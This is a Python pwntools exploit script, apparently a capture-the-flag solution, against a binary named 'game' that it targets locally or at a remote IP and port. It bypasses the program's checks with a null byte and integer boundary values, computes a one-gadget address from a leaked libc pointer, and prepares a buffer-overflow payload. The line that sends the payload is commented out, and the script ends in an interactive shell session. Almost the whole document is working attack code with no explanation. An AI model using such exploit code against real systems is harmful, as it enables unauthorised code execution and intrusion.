from __future__ import print_function
from pwn import *

local = True
elf = 'game' 

if local: 
	context.binary = './'+elf
	r = process("./"+elf)
else: 
	ip = "140.114.77.172"
	port = 10111
	r = remote(ip,port)

print(r.recvuntil('\n'), end='')	# Try my secret :
r.sendline('\x00')
print(r.recvuntil('\n'),end='')	# Give me a magic number :
r.sendline(str(-2147483648))
print(str(-2147483648))
print(r.recvuntil('\n'),end='')	# Passed!
print(r.recvuntil('\n'),end='')	# You win.
print(r.recvuntil(': '),end='')	# Here is your reward :
gadget = r.recvuntil('\n')
print(gadget, end='')
gadget = int(gadget, 0)
gadget = gadget - 0x64e80 + 0x4f322
print(r.recvuntil('\n'),end='') # Leave your name :
print('Kerker')
r.sendline('Kerker')
print(r.recvuntil('\n'),end='') # Winner can leave message at here :
print(r.recvuntil('\n'),end='') # size:
print(str(2147483647))
r.sendline(str(2147483647))
print(r.recvuntil('\n'),end='') # Your message :
gadget = p64(gadget, endian='little')
#r.sendline('\x00'*(1024-32+8+16)+gadget)
r.interactive()
